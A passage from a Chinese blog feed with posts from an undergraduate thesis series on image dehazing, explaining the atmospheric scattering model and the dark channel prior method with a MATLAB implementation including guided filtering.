        <content type="html"><![CDATA[<p>i&gt; 本科毕设题目为《基于深度学习的图像去雾方法研究与实现》</p><p>毕设总结系列：</p><ul><li><a href="https://www.ravenxrz.ink/archives/880ba6e.html">毕设总结零–绪论</a></li><li><a href="https://www.ravenxrz.ink/archives/a513887d.html">毕设总结一–传统去雾理论</a></li><li><a href="https://www.ravenxrz.ink/archives/81fcc536.html">毕设总结二–论文复现工作1–暗通道去雾(DCP)</a></li><li><a href="https://www.ravenxrz.ink/archives/15ae521b.html">毕设总结三–论文复现工作2–MSCNN去雾</a></li><li><a href="https://www.ravenxrz.ink/archives/6631bc9b.html">毕设总结四–最终去雾方案的确定与实现–DeBlurGanToDehaze</a></li><li><a href="https://www.ravenxrz.ink/archives/2caf6b87.html">毕设总结五–杂项</a><a id="more"></a><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2></li></ul><p>上一篇文章中，咱们介绍了传统的去雾理论，在传统去雾方法中，最为出名的当属暗通道去雾了。这篇文章将介绍如何实现DCP。</p><p>参考文章：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vSW1hZ2VzaG9wL3AvMzI4MTcwMy5odG1s" title="https://www.cnblogs.com/Imageshop/p/3281703.html">《Single Image Haze Removal Using Dark Channel Prior》一文中图像去雾算法的原理、实现、效果（速度可实时）<i class="fa fa-external-link"></i></span></p><p>本篇中的所有代码均采用Matlab实现，所有代码均已开源，地址将放于文末。</p><h2 id="2-DCP"><a href="#2-DCP" class="headerlink" title="2. DCP"></a>2. DCP</h2><h3 id="2-1-暗通道先验"><a href="#2-1-暗通道先验" class="headerlink" title="2.1 暗通道先验"></a>2.1 暗通道先验</h3><p>要实现DCP去雾，首先应该知道什么是暗通道先验。</p><p>i&gt; 在绝大多数非天空的局部区域里，某一些像素总会有至少一个颜色通道具有很低的值。换言之，该区域光强度的最小值是个很小的数。</p><p>我们给暗通道一个数学定义，对于任意的输入图像J，其暗通道可以用下式表达：<br>$$<br>J^{dark}(x) = \\min \\limits_{y\\in \Omega(x)} (\min \limits_{c\in \{r,g,b\}}J^c(y))        \quad \quad (1)<br>$$<br>其中：</p><ul><li>$J^{c}$表示彩图的每个通道图，$\Omega(x)$表示以像素x为中心的一个窗口。</li></ul><p>如何用代码实现对一个原图求其暗通道图呢？可参考如下代码：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 定义去雾参数</span></span><br><span class="line">kenlRatio = <span class="number">.01</span>;              <span class="comment">% 最小化滤波时用的窗口占整幅图片的比例</span></span><br><span class="line">img = haze_img;             <span class="comment">% 原图</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% 获取图像宽高</span></span><br><span class="line">sz=<span class="built_in">size</span>(img);</span><br><span class="line">w=sz(<span class="number">2</span>);</span><br><span class="line">h=sz(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 获取暗通道</span></span><br><span class="line"><span class="comment">% 暗通道第一步：获取最小化RGB分量得到的通道图 </span></span><br><span class="line">dc = <span class="built_in">zeros</span>(h,w);</span><br><span class="line"><span class="keyword">for</span> y=<span class="number">1</span>:h</span><br><span class="line">    <span class="keyword">for</span> x=<span class="number">1</span>:w</span><br><span class="line">        dc(y,x) = <span class="built_in">min</span>(img(y,x,:));</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% 暗通道第二步：最小化窗口滤波</span></span><br><span class="line"><span class="comment">% 定义滤波窗口</span></span><br><span class="line">krnlsz = <span class="built_in">floor</span>(<span class="built_in">max</span>([<span class="number">3</span>, w*kenlRatio, h*kenlRatio]));</span><br><span class="line">dc2 = minfilt2(dc, [krnlsz,krnlsz]);</span><br><span class="line">dc2(h,w)=<span class="number">0</span>;     <span class="comment">% 滤波后，最后一个图像单位没有了，这里手动补齐 </span></span><br></pre></td></tr></table></figure><p>i&gt; <strong>暗通道先验的理论指出：</strong><br>$$<br>J^{dark} -&gt; 0 \quad \quad (2)<br>$$<br> 实际生活中造成暗原色中低通道值主要有三个因素：</p><ol><li>汽车、建筑物和城市中玻璃窗户的阴影，或者是树叶、树与岩石等自然景观的投影；</li><li>色彩鲜艳的物体或表面，在RGB的三个通道中有些通道的值很低（比如绿色的草地／树／植物，红色或黄色的花朵／叶子，或者蓝色的水面）；</li><li>颜色较暗的物体或者表面，例如灰暗色的树干和石头。总之，自然景物中到处都是阴影或者彩色，这些景物的图像的暗原色总是很灰暗的。</li></ol><h3 id="2-2-基于暗通道的去雾推理"><a href="#2-2-基于暗通道的去雾推理" class="headerlink" title="2.2 基于暗通道的去雾推理"></a>2.2 基于暗通道的去雾推理</h3><p>在系列二的文章中，我们曾提到过大气散射模型的简化公式:<br>$$<br>I(x) = J(x)t(x) + A(1-t(x))        \quad\quad (3)<br>$$<br>其中，</p><ul><li>$x $表示图片中的索引位置</li><li>$I$ 表示最终的雾图</li><li>$J$表示无雾图</li><li>$t$表示透射图(这个翻译并不好，英文中为transmission map),每一个$t(x)$表示的是透射率，即光束经过各种散射杂质所未被散射掉的比率。所有$t(x)$组成了$t$。</li><li>$A$全局大气光</li></ul><p>两边同除A，可得：<br>$$<br>\frac{I^c(x)}{A^c} = t(x) \frac{J^c(x)}{A^c} + 1-t(x) \quad \quad(4)<br>$$<br>​    如上所述，上标C表示R/G/B三个通道的意思。    首先假设在每一个窗口内透射率t(x)为常数，定义他为$\hat{t}$，并且A值已经给定，然后对式（7）两边求两次最小值运算，得到下式：<br>$$<br>\min\limits_{y\in\Omega(x)}(\min\limits_c\frac{I^c(x)}{A^c}) = \hat{t(x) }\min\limits_{y\in\Omega(x)}\frac{J^c(x)}{A^c} + 1-\hat{t(x)} \quad \quad(5)<br>$$<br>​    上式中，J是待求的无雾的图像，根据前述的暗原色先验理论有：<br>$$<br>J^{dark}(x) = \min\limits_{y\in\Omega(x)}(\min\limits_cJ^c(y)) = 0 \quad \quad(6)<br>$$<br>因此，可推导出:<br>$$<br>\min\limits_{y\in\Omega(x)}(\min\limits_c\frac{J^c(y)}{A^c}) = 0 \quad \quad(7)<br>$$</p><p>将公式(7)带回公式(5)中，可得:<br>$$<br>\hat{t(x)} = 1- \min\limits_{y\in\Omega(x)}(\min\limits_c\frac{I^c(y)}{A^c}) \quad \quad(8)<br>$$<br>i&gt; 上面就是暗通道去雾的理论了，它的目标就是用于估计投射图t。</p><p>说了这么多理论，咱们来看看暗通道的实际效果吧。</p><p><strong>对于无雾图</strong>，那么它应该是符合暗通道先验的，也就是说对它求暗通道图的话，暗通道图应该整体偏黑：</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1UoaFdkWE3KVjSZSy760ocXXay.png" width="300"/><img data-src="https://ae01.alicdn.com/kf/HTB1DoyFdkWE3KVjSZSy760ocXXap.png" width="300"/></p><p><img data-src="https://ae01.alicdn.com/kf/HTB15e5CdfWG3KVjSZFgq6zTspXaY.jpg" width="300"/><img data-src="https://ae01.alicdn.com/kf/HTB1K8iFdlGE3KVjSZFh763kaFXaz.png" width="300"/></p><p><strong>对于带雾图，</strong>它是不应该符合暗通道先验的，也就是说对它求暗通道图的话，暗通道图不会整体偏黑：</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1x3WGdlaE3KVjSZLe760sSFXah.png" width="300"/><img data-src="https://ae01.alicdn.com/kf/HTB1HUeCdfWG3KVjSZPc762kbXXa8.png" width="300"/></p><p><img data-src="https://ae01.alicdn.com/kf/HTB1K1qFdouF3KVjSZK9762VtXXa1.png" width="300"/><img data-src="https://ae01.alicdn.com/kf/HTB1vLTQavBj_uVjSZFp7630SXXaq.png" width="300"/></p><p>假设全局大气光A已知（实际上我在系列二中也给出了A的估计算法），利用暗通道先验我们也可以求得透射图t，那么就可以利用系列二中提到的去雾公式进行去雾了:<br>$$<br>J(x) = \frac{I(x)-A}{\max (t(x),t_0)} + A        \quad\quad (9)<br>$$<br>A的估计算法：</p><ol><li>从暗通道图中按照亮度的大小取前0.1%的像素。</li><li>在这些位置中，在原始有雾图像I中寻找对应的具有最高亮度的点的值，作为A值。</li></ol><h3 id="2-3-暗通道去雾效果展示及优化"><a href="#2-3-暗通道去雾效果展示及优化" class="headerlink" title="2.3 暗通道去雾效果展示及优化"></a>2.3 暗通道去雾效果展示及优化</h3><p>来看看运用这个模型的去雾效果：</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1dPODdoCF3KVjSZJnq6znHFXat.jpg" width="300"/><img data-src="https://ae01.alicdn.com/kf/HTB1Y_iMdlCw3KVjSZFu763AOpXaG.png" width="300"/></p><p><img data-src="https://ae01.alicdn.com/kf/HTB1K1qFdouF3KVjSZK9762VtXXa1.png" width="300"/><img data-src="https://ae01.alicdn.com/kf/HTB19c6RavBj_uVjSZFp7630SXXaX.png" width="300"/></p><p>可以看到，其实去雾效果还不错，但是意到第一幅图的原图两个字的周围明显有一块不协调的地方，而第二图顶部水平方向似乎有一块没有进行去雾处理，这些都是由于我们的透射率图过于粗糙了。</p><p>后来提出了<strong>导向滤波</strong>的方法，可以获得更好的透射图。</p><p>未使用导向滤波与使用导向滤波的去雾结果及透射图对比图：</p><p><img data-src="https://ae01.alicdn.com/kf/HTB19c6RavBj_uVjSZFp7630SXXaX.png" width="300"/><img data-src="https://ae01.alicdn.com/kf/HTB1e3DRavBj_uVjSZFp7630SXXaV.png" width="300"/></p><p><img data-src="https://ae01.alicdn.com/kf/HTB1pa5EdoGF3KVjSZFo762mpFXad.png" width="300"/><img data-src="https://ae01.alicdn.com/kf/HTB1RtKHdkWE3KVjSZSy760ocXXah.png" width="300"/></p><p>加入导向滤波后的去雾效果：</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1hLuNda1s3KVjSZFA760_ZXXaG.png" width="300"/><img data-src="https://ae01.alicdn.com/kf/HTB1l9GDdhiH3KVjSZPf760BiVXa6.png" width="300"/></p><p><img data-src="https://ae01.alicdn.com/kf/HTB1BtSDdf1H3KVjSZFH762KppXaa.png" width="300"/><img data-src="https://ae01.alicdn.com/kf/HTB13k9rb7xz61VjSZFr760eLFXaP.png" width="300"/></p><h2 id="3-完整代码及分析"><a href="#3-完整代码及分析" class="headerlink" title="3. 完整代码及分析"></a>3. 完整代码及分析</h2><p>完整代码：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">y</span> = <span class="title">dehaze</span><span class="params">(haze_img)</span></span></span><br><span class="line"><span class="comment">% 去雾函数: 根据输入雾图矩阵进行去雾，返回去雾后的图片矩阵</span></span><br><span class="line"><span class="comment">%   haze_img: 雾图矩阵</span></span><br><span class="line"><span class="comment">%   y:         去雾后的矩阵</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% 定义去雾参数</span></span><br><span class="line">mint = <span class="number">0.05</span>;     <span class="comment">% 限定最小透射率</span></span><br><span class="line">maxA = <span class="number">240</span>;     <span class="comment">% 限定A的最大值</span></span><br><span class="line">kenlRatio = <span class="number">.01</span>;                <span class="comment">% 最小化滤波时用的窗口占整幅图片的比例</span></span><br><span class="line">img = haze_img;             <span class="comment">% 原图</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% 获取图像宽高</span></span><br><span class="line">sz=<span class="built_in">size</span>(img);</span><br><span class="line">w=sz(<span class="number">2</span>);</span><br><span class="line">h=sz(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 获取暗通道</span></span><br><span class="line"><span class="comment">% 暗通道第一步：获取最小化RGB分量得到的通道图 </span></span><br><span class="line">dc = <span class="built_in">zeros</span>(h,w);</span><br><span class="line"><span class="keyword">for</span> y=<span class="number">1</span>:h</span><br><span class="line">    <span class="keyword">for</span> x=<span class="number">1</span>:w</span><br><span class="line">        dc(y,x) = <span class="built_in">min</span>(img(y,x,:));</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% 暗通道第二步：最小化窗口滤波</span></span><br><span class="line"><span class="comment">% 定义滤波窗口</span></span><br><span class="line">krnlsz = <span class="built_in">floor</span>(<span class="built_in">max</span>([<span class="number">3</span>, w*kenlRatio, h*kenlRatio]));</span><br><span class="line">dc2 = minfilt2(dc, [krnlsz,krnlsz]);</span><br><span class="line">dc2(h,w)=<span class="number">0</span>;     <span class="comment">% 滤波后，最后一个图像单位没有了，这里手动补齐 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">% 估计大气光</span></span><br><span class="line">A = <span class="built_in">min</span>(maxA,get_airlight(haze_img,dc2));</span><br><span class="line"><span class="comment">% 得到透射图</span></span><br><span class="line">t = <span class="number">1</span> - dc2./A;</span><br><span class="line">t_d=double(t);</span><br><span class="line">img_d = double(img);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 加入导向滤波，得到更精细的透射图</span></span><br><span class="line">r = krnlsz*<span class="number">4</span>;</span><br><span class="line"><span class="built_in">eps</span> = <span class="number">10</span>^<span class="number">-6</span>;</span><br><span class="line">filtered = guidedfilter(double(rgb2gray(img))/<span class="number">255</span>, t_d, r, <span class="built_in">eps</span>);</span><br><span class="line">t_d = filtered;</span><br><span class="line"></span><br><span class="line"><span class="comment">% 根据新的透射图，得到去雾图</span></span><br><span class="line">t_d(t_d &lt; mint) = mint;</span><br><span class="line">J(:,:,<span class="number">1</span>) = (img_d(:,:,<span class="number">1</span>) - (<span class="number">1</span>-t_d)*A)./t_d;</span><br><span class="line">J(:,:,<span class="number">2</span>) = (img_d(:,:,<span class="number">2</span>) - (<span class="number">1</span>-t_d)*A)./t_d;</span><br><span class="line">J(:,:,<span class="number">3</span>) = (img_d(:,:,<span class="number">3</span>) - (<span class="number">1</span>-t_d)*A)./t_d;</span><br><span class="line"></span><br><span class="line">y = uint8(J);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 显示对比图</span></span><br><span class="line">subplot(<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>);</span><br><span class="line">imshow(haze_img);</span><br><span class="line">subplot(<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">imshow(y);</span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span> = <span class="title">get_airlight</span><span class="params">(hazeimg,darkchannel)</span></span></span><br><span class="line"><span class="comment">% 根据雾图及对应暗通道图获取大气光</span></span><br><span class="line"><span class="comment">% hazeimg 雾图</span></span><br><span class="line"><span class="comment">% darkchannel hazeimg的暗通道图</span></span><br><span class="line">ratio = <span class="number">0.01</span>;       <span class="comment">% 取暗通道大小的前0.1% </span></span><br><span class="line"><span class="comment">% 求解前0.1%的暗通道索引位置</span></span><br><span class="line">sorted_dc = <span class="built_in">sort</span>(darkchannel(:),<span class="string">&#x27;descend&#x27;</span>);</span><br><span class="line">[h,w] = <span class="built_in">size</span>(sorted_dc);</span><br><span class="line">tmp_idx = <span class="built_in">round</span>(h*w*ratio);</span><br><span class="line">tmp_idx_value = sorted_dc(tmp_idx);</span><br><span class="line">idx = darkchannel &gt;= tmp_idx_value;</span><br><span class="line"><span class="comment">% 寻找这些位置上最亮的点最为A</span></span><br><span class="line">A = double(<span class="built_in">max</span>(hazeimg(idx)));</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>其实代码中写的很清楚了，但是为方便理解，在简单说下流程吧。</p><p>第一步，求解雾图的暗通道图。</p><p>第二步，根据前文提到的算法求解大气光。</p><p>第三步，应用公式（8）求解透射图t。</p><p>第四步，导向滤波，得到更精细的透射图。</p><p>第五步，应用公式(9)去雾。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vSW1hZ2VzaG9wL3AvMzI4MTcwMy5odG1s" title="https://www.cnblogs.com/Imageshop/p/3281703.html">《Single Image Haze Removal Using Dark Channel Prior》一文中图像去雾算法的原理、实现、效果（速度可实时）<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BpYW94dWV6aG9uZy9hcnRpY2xlL2RldGFpbHMvNzgzNzI3ODc=" title="https://blog.csdn.net/piaoxuezhong/article/details/78372787">guided Filter–引导滤波算法原理及实现<i class="fa fa-external-link"></i></span></li></ol><p>所有源代码地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVuLWRlaGF6ZS13b3JrL0RDUC1EZWhhemU=" title="https://github.com/raven-dehaze-work/DCP-Dehaze">https://github.com/raven-dehaze-work/DCP-Dehaze<i class="fa fa-external-link"></i></span></p>]]></content>
      
      
      <categories>
          
          <category> 深度学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图像去雾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕设总结一-传统去雾理论</title>
      <link href="/archives/a513887d.html"/>
      <url>/archives/a513887d.html</url>
      
        <content type="html"><![CDATA[<p>i&gt; 本科毕设题目为《基于深度学习的图像去雾方法研究与实现》</p><p>毕设总结系列：</p><ul><li><a href="https://www.ravenxrz.ink/archives/880ba6e.html">毕设总结零–绪论</a></li><li><a href="https://www.ravenxrz.ink/archives/a513887d.html">毕设总结一–传统去雾理论</a></li><li><a href="https://www.ravenxrz.ink/archives/81fcc536.html">毕设总结二–论文复现工作1–暗通道去雾(DCP)</a></li><li><a href="https://www.ravenxrz.ink/archives/15ae521b.html">毕设总结三–论文复现工作2–MSCNN去雾</a></li><li><a href="https://www.ravenxrz.ink/archives/6631bc9b.html">毕设总结四–最终去雾方案的确定与实现–DeBlurGanToDehaze</a></li><li><a href="https://www.ravenxrz.ink/archives/2caf6b87.html">毕设总结五–杂项</a><a id="more"></a><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2></li></ul><p>上一篇文章中，讲述了我整个毕设课题的时间线安排，从这篇开始就正式对我的毕设进行总结。这篇的主题是–<strong>”传统去雾理论“</strong>，我们将会从大气散射模型入手来。</p><p>为什么要介绍大气散射模型呢？</p><p>我们要对带雾图进行去雾操作，首先要知道雾图的形成过程是怎样的，从行成原理出发最后得到去雾的数学模型。而“大气散射模型”可以用来描述雾图的形成过程。</p><h2 id="2-大气散射模型"><a href="#2-大气散射模型" class="headerlink" title="2. 大气散射模型"></a>2. 大气散射模型</h2><p>首先先贴上一张整体图：</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1BR9odouF3KVjSZK9q6zVtXXaG.jpg"></p><p>注意在这张图中的箭头代表光线传播途径，这些箭头又分为了两种颜色（蓝色和绿色），两种颜色代表了两种不同的衰减。下面分别介绍这两种衰减。</p><p>i&gt; 下文中所提及的公式没有包含完全的推导，要了解完全的推导，可参考文献[1]。</p><h3 id="2-1-入射光衰减模型"><a href="#2-1-入射光衰减模型" class="headerlink" title="2.1 入射光衰减模型"></a>2.1 入射光衰减模型</h3><p>让我们来关注<strong>蓝色箭头</strong>的传播路径，把它更详细的展开：</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1BayRX3FY.1VjSZFqq6ydbXXan.jpg"></p><p>入射光线在<strong>目标场景表面发生反射</strong>，反射的光线在传播到观测点位置处成像装置的过程中，与<strong>悬浮在空中的微粒碰撞发生散射</strong>，从图中可以直观的看到有相当一部分的反射光线在发生散射后没有传播到成像装置。<strong>这部分传播到其他位置的光线就是入射光的衰减</strong>。目标场景所反射光线的衰减程度与观测点位置处成像装置的空间距离有很大关系，<strong>空间距离越大，景深也就越深，传播过程中发生散射的机率也越大，相应的光线衰减程度也就越大</strong>，最后传播到成像装置的光线会变得很少，所捕获的的图像信息往往模糊不清。</p><p>这部分的数学模型可由下式表达：<br>$$<br>E_i(d,\lambda) = E_0(\lambda)e^{-\beta(\lambda)d}        \quad\quad (1)<br>$$<br>其中，</p><ul><li>$E_i(d,\lambda))$表示的是在成像设备处的光束辐射强度；</li><li>$E_0(\lambda)$表示目标物体反射光处的辐射强度；</li><li>$\beta(\lambda)$ 是大气传播介质的散射系数；</li><li>$\lambda$光波长度；</li><li>$d$ 是景深距离，也即成像设备距离目标物体之间的距离。</li></ul><h3 id="2-2-大气光成像模型"><a href="#2-2-大气光成像模型" class="headerlink" title="2.2 大气光成像模型"></a>2.2 大气光成像模型</h3><p>除了成像反射光能够进入到成像设备外，大气中还有很多杂光因为各种散射而进入到成像设备中。也就是上图中的绿色箭头部分。</p><p>这部分的数学模型可由下式表达:<br>$$<br>E_A(d,\lambda) = E_\infty(\lambda)(1-e^{-\beta(\lambda)d})    \quad\quad (2)<br>$$<br>其中，</p><ul><li>$E_A(d,\lambda)$大气光在成像设备处的辐照强度；</li><li>$E_\infty(\lambda)$表示当目标场景与成像设备无穷远时，大气光在成像设备处的辐照强度。</li><li>其余参数同上。</li></ul><h3 id="2-3-雾图形成模型及简化"><a href="#2-3-雾图形成模型及简化" class="headerlink" title="2.3 雾图形成模型及简化"></a>2.3 雾图形成模型及简化</h3><p>有了2.1和2.2的介绍，总的光强也即雾图可由下式表达：<br>$$<br>E(d,\lambda) = E_i(d,\lambda) +  E_A(d,\lambda) = E_0(\lambda)e^{-\beta(\lambda)d} + E_\infty(\lambda)(1-e^{-\beta(\lambda)d})    \quad\quad (3)<br>$$<br>是不是感觉还是一头雾水?这些参数即使解释了也看不懂？没关系，因为在我的去雾过程中根本不会用这个公式，（当然结合参考文献[1]应该还是懂这个公式的意思的）。而是会用它的简化公式，令<br>$$<br>I(x) = E(d,\lambda),J(x) = E_0(\lambda),t(x) = e^{-\beta(\lambda)d,A=E_\infty(\lambda)}<br>$$<br>可以得到简化后的公式<br>$$<br>E(d,\lambda)= E_0(\lambda)e^{-\beta(\lambda)d} + E_\infty(\lambda)(1-e^{-\beta(\lambda)d}) \\<br>I(x) = J(x)t(x) + A(1-t(x))        \quad\quad (4)<br>$$<br>其中，</p><ul><li><p>$x $表示图片中的索引位置</p></li><li><p>$I$ 表示最终的雾图</p></li><li><p>$J$表示无雾图</p></li><li><p>$t$表示透射图(这个翻译并不好，英文中为transmission map),每一个$t(x)$表示的是透射率，即光束经过各种散射杂质所未被散射掉的比率。所有$t(x)$组成了$t$。</p></li><li><p>$A$全局大气光</p></li></ul><h2 id="3-去雾模型"><a href="#3-去雾模型" class="headerlink" title="3. 去雾模型"></a>3. 去雾模型</h2><p>2.3小结我们得到了简化后的大气散射模型公式，对它进行一个简单的变形就可以得到去雾公式：<br>$$<br>J(x) = \frac{I(x) - A}{t(x)} + A        \quad\quad (5)<br>$$<br>可以发现，去雾是一个病态问题（只给我一个雾图，我去哪儿找其他两个参数），重点需要估计的参数有两个：1）透射图t；2）全局大气光A。有大量论文集中在这两个参数的估计。</p><ul><li>传统方法是基于某种先验知识去雾，最出名的当属暗通道去雾(DCP)[2]，基于暗通道先验。</li><li>不少深度学习的方法也是用某种网络结构去估计透射图，然后再采用某种方法估计A，最后应用上述公式去雾。如MSCNN[3]。</li></ul><p>仔细观察上式，我们发现t(x)作为了分母，如果$t(x)$估计过小，则估计出来的$J(x)$也就是无雾图将会过曝，所以实际上通常会对$t(x)$做一定阈值处理：限制一个最小值$t_0$，防止过曝。最终的去雾公式如下:<br>$$<br>J(x) = \frac{I(x)-A}{\max (t(x),t_0)} + A        \quad\quad (6)<br>$$</p><p>不管是传统方法还是深度学习方法，大多都是在估计透射率，那么A是怎么估计的呢？</p><p>观察公式(4)，我们令$d-&gt;\infty$,则可得到<br>$$<br>A = I(x) , d(x) -&gt; \infty    \quad\quad (7)<br>$$</p><p>然而现实生活中，景深距离不可能达到无穷大。但是足够大的景深距离仍能得到较低的透射率。于是一种常用的方法是这样的，<strong>从雾天图像中找到透射率低于$t_0$时所对应的最大光照强度作为大气光$A$的估算值</strong>：<br>$$<br>A = \quad \max\limits_{y\in\{x|t(x) \le t_0\}} \quad I(y)    \quad\quad (8)<br>$$</p><hr><p>上面所分析的都是分别单独估计两个参数，这样有一个弊端，单独估计两者会带来额外的误差，文献[4]对公式(5)进行了变形，将t和A融合成了一个参数来估计，避免额外误差。变形公式(9):<br>$$<br>\begin{equation}<br>    \begin{gathered}<br>    J(x) = K(x)I(x) - K(x) + b , where\\<br>    K(x) = \frac{<br>        \frac{1}{t(x)}(I(x) - A) + (A -b )<br>    }{<br>        I(x) -1<br>    }<br>    \end{gathered}<br>    \end{equation}        \quad\quad (9)<br>$$</p><p>这样只用估计k就可以了。</p><h2 id="4-结语"><a href="#4-结语" class="headerlink" title="4. 结语"></a>4. 结语</h2><p>在这篇文章中，我们从大气散射模型出发，分析了雾图的形成过程，进一步地对公式进行变形得到了去雾公式。但是理论公式会让人觉得落不到地，在下一篇文章中，我们会从代码层次实现DCP去雾算法，这样就会对这些公式有更深的理解。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li>贾绪仲. 基于深度学习的图像去雾方法研究[D]. 湖南工业大学, 2018.</li><li>HE K, SUN J, TANG X. Single image haze removal using dark channel prior[J]. IEEE transactions on pattern analysis and machine intelligence, 2011, 33(12): 2341–2353.</li><li>REN W, LIU S, ZHANG H, 等. Single Image Dehazing via Multi-scale Convolutional Neural Networks[G]//LEIBE B, MATAS J, SEBE N, 等. Computer Vision – ECCV 2016. Cham: Springer International Publishing, 2016, 9906: 154–169.</li><li>LI B, PENG X, WANG Z, 等. Aod-net: All-in-one dehazing network[C]//Proceedings of the IEEE International Conference on Computer Vision. 2017, 1: 7.</li></ol>]]></content>
      
      
      <categories>
          
          <category> 深度学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图像去雾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕设总结零-绪论</title>
      <link href="/archives/880ba6e.html"/>
      <url>/archives/880ba6e.html</url>
      
        <content type="html"><![CDATA[<p>i&gt; 本科毕设题目为《基于深度学习的图像去雾方法研究与实现》</p><p>毕设总结系列：</p><ul><li><a href="https://www.ravenxrz.ink/archives/880ba6e.html">毕设总结零–绪论</a></li><li><a href="https://www.ravenxrz.ink/archives/a513887d.html">毕设总结一–传统去雾理论</a></li><li><a href="https://www.ravenxrz.ink/archives/81fcc536.html">毕设总结二–论文复现工作1–暗通道去雾(DCP)</a></li><li><a href="https://www.ravenxrz.ink/archives/15ae521b.html">毕设总结三–论文复现工作2–MSCNN去雾</a></li><li><a href="https://www.ravenxrz.ink/archives/6631bc9b.html">毕设总结四–最终去雾方案的确定与实现–DeBlurGanToDehaze</a></li><li><a href="https://www.ravenxrz.ink/archives/2caf6b87.html">毕设总结五–杂项</a><a id="more"></a></li></ul><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p><strong>2019/6/11</strong>日，毕设答辩结束，意味着我本科四年的学习生涯也画上了句号。从1月初拿到毕设课题到今日已过5月，收获良多，也算是为未来的研究生生涯提前试水吧（虽然研究生方向不做深度学习，不过算是了解了做一个课题需要做的大体流程，以及掌握了一些软件的使用）。</p><p>i&gt; 本科毕设题目为《基于深度学习的图像去雾方法研究与实现》</p><p>题目简单易懂，也就是两点：</p><ul><li>要<strong>基于深度学习</strong></li><li>目的就是做<strong>图像去雾</strong>。</li></ul><p>也就是：</p><p><img data-src="https://ae01.alicdn.com/kf/HTB10.78c8Kw3KVjSZTEq6AuRpXab.jpg"></p><p>嗯，既然目标明确，那就撸起袖子开始干吧。</p><h2 id="2-任务时间线"><a href="#2-任务时间线" class="headerlink" title="2. 